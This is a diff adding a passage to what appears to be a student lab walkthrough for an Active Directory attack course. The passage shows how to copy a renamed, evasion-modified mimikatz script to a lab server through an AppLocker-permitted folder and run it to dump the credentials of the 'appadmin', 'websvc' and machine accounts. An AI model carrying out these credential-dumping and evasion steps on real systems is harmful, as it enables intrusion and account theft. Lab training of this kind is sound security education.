@@ -373,6 +373,47 @@ Here, `Everyone` can run scripts from the ‘**Program Files**’ directory. Tha
 
 #### Create Invoke-TheKatEx-keys-stdX.ps1
 
+* Create a copy of `Invoke-TheKat.ps1` and rename it to `Invoke-TheKatEx-keys-stdX.ps1` (where X is your student ID).
+* Open `Invoke-TheKatEx-keys-stdX.ps1` in PowerShell ISE (Right click on it and click Edit).
+* Add the below encoded value for `token-evasive-elevate` and `sekurlsa::evasive-ekeys` to the end of the file.
+
+<figure><img src="../../../.gitbook/assets/image (548).png" alt=""><figcaption></figcaption></figure>
+
+On student machine run the following command from a PowerShell session.&#x20;
+
+> Note that it will take several minutes for the copy process to complete.
+
+Share it to dcorp-adminsrv pc -->
+
+> Remember user administrative shell + invisihell + powerview
+
+```
+PS C:\AD\Tools> Copy-Item C:\AD\Tools\Invoke-TheKatEx-keys-std113.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+```
+
+> The file `Invoke-MimiEx.ps1` is copied to the dcorp-adminsrv server.
+>
+> ```
+> [dcorp-adminsrv]: PS C:\Program Files> ls
+>
+>     Directory: C:\Program Files
+>
+> [snip]
+> -a----         11/28/2024  04:38 AM        3063603 Invoke-TheKatEx-keys-stdX.ps1
+> ```
+
+Now, run the modified mimikatz script.&#x20;
+
+> Note that there is no dot sourcing here. It may take a couple of minutes for the script execution to complete:
+
+```
+.\Invoke-TheKatEx-keys-std113.ps1
+```
+
+<figure><img src="../../../.gitbook/assets/image (549).png" alt=""><figcaption></figcaption></figure>
+
+<mark style="background-color:orange;">Here we find the credentials of the</mark> <mark style="background-color:orange;"></mark><mark style="background-color:orange;">`dcorp-adminsrv$`</mark><mark style="background-color:orange;">,</mark> <mark style="background-color:orange;"></mark><mark style="background-color:orange;">`appadmin`</mark> <mark style="background-color:orange;"></mark><mark style="background-color:orange;">and</mark> <mark style="background-color:orange;"></mark><mark style="background-color:orange;">`websvc`</mark> <mark style="background-color:orange;"></mark><mark style="background-color:orange;">users.</mark>
+
 
 
 [^1]: 
